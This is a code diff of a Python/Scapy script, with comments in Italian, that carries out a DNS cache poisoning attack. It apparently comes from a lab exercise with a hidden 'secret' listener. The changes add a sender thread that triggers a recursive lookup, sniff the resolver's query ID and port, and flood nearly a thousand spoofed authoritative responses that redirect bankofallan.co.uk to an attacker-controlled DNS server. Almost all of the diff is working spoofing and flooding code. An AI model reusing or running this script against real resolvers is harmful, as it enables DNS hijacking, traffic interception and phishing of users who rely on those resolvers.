@@ -17,11 +17,10 @@ PACKETS = []
 
 class FirstThread(Thread):
 
-        def __init__(self, name, job, flood):
+        def __init__(self, name, job):
                 Thread.__init__(self)
                 self.name = name
                 self.job = job
-                self.flood = flood
 
         def run(self):
                 #print ("Thread '" + self.name + "' avviato")
@@ -30,23 +29,39 @@ class FirstThread(Thread):
                 if self.job == 0:                                                       # sniffer
                         sniffer_job()
 
+                if self.job == 1:                                                       # sender
+                        sender_job()
+
                 if self.job == 4:                                                       # in ascolto per il secret
                         secret_job()
 
                 #print ("[THREAD] '" + self.name + "' terminato.")
 
+
+def sender_job():
+        '''
+        invio la prima query DNS per badguy.ru
+        :return:
+        '''
+        time.sleep(1)
+        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
+        #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
+        # p.show()
+
+
 def sniffer_job():
         '''
-        sniffo la query ricorsiva fatta all'host (server autoritativo per badguy.ru)
+        sniffo la query ricorsiva fatta all'host per badguy.ru
         catturo query ID e numero di porta
         :return:
         '''
         global Q_ID
         global PORT_NUMBER
+
         filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
-        #print filtro
         # TODO deve cambiare se la porta non e' 53
-        pkts = sniff(count=1,
+
+        pkts = sniff(count=1, timeout=1,
                      filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                      lfilter=lambda pkt: pkt.haslayer(DNS))
 
@@ -71,39 +86,63 @@ def master_job():
         global Q_ID
         global PORT_NUMBER
         global N_TRY
-        global  PACKETS
+        global PACKETS
 
-        listener_thread = FirstThread(name="listener", job=4, flood=None)
+        listener_thread = FirstThread(name="listener", job=4)
         listener_thread.start()
-
 
         while GOAL == 0:
                 print ('\n\n\nTry # ' + str(N_TRY))
 
-                sniffer_thread = FirstThread(name="sniffer", job=0, flood=None)
+                sniffer_thread = FirstThread(name="sniffer", job=0)
                 sniffer_thread.start()
 
-                send(IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000))) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
-                while Q_ID == 0 or PORT_NUMBER == 0:
+                sender_thread = FirstThread(name="sender", job=1)
+                sender_thread.start()
+                sender_thread.join()
+
+                if Q_ID == 0 or PORT_NUMBER == 0:
+                        sniffer_thread.join()
                         continue
 
-                sniffer_thread.join()
+                print ('[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
 
-                print ('[FOUND] qID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
+                #print ("len2: " + str(len(PACKETS)))
+                # preparo i pacchetti
 
-                # preparo i Q_ID dei pacchetti
-                for index in range(0, 999):
-                        PACKETS[i+1].getlayer(DNS).id = Q_ID + 1 + index
-                        PACKETS[i+1].getlayer(DNS).sport = PORT_NUMBER
+                spoof = IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))
+                PACKETS.append(spoof)
+
+                for index in range(1, 999):
+                        pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
+                              DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
+                                  qdcount=1, ancount=1,
+                                  nscount=0, arcount=0,
+                                  qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
+                                  an=None,
+                                  ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
+                                            rdata='bankofallan.co.uk')),
+                                  ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
+                                            rdata=BAD_DNS_IP)) /
+                                     DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
+                        PACKETS.append(pkt)
 
                 # TODO controllare le porte
-                PACKETS.insert(0, (IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000)), dport=53) / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))))
+                # PACKETS.insert(0, (IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000)), dport=53) / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))))
+                #PACKETS.insert(0, (IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))))
+
+
+                # TODO forse verbose=0
+                #time1 = time.time()
                 send(PACKETS)
+                #time2 = time.time()
+                #print ("\t\t\t\ttime elapsed: " + str(time2 - time1))
 
                 PORT_NUMBER = 0
                 Q_ID = 0
                 N_TRY = N_TRY + 1
-                del PACKETS[0]
+                #del PACKETS[0]
+                PACKETS = []
 
         # forse GOAL viene visto al ciclo successivo se il listener e' lento
         print "Goal reached."
@@ -114,7 +153,7 @@ def master_job():
 ############################ MAIN ###########################
 
 # inizzializzazione treno pacchetti
-pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
+'''pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
         DNS(id= 0, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
             qdcount=1, ancount=1,
             nscount=0, arcount=0,
@@ -128,5 +167,6 @@ pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) /
 
 for i in range(1, 1000):
         PACKETS.append(pkt)
+#print ("len1: " + str(len(PACKETS)))'''
 
 master_job()
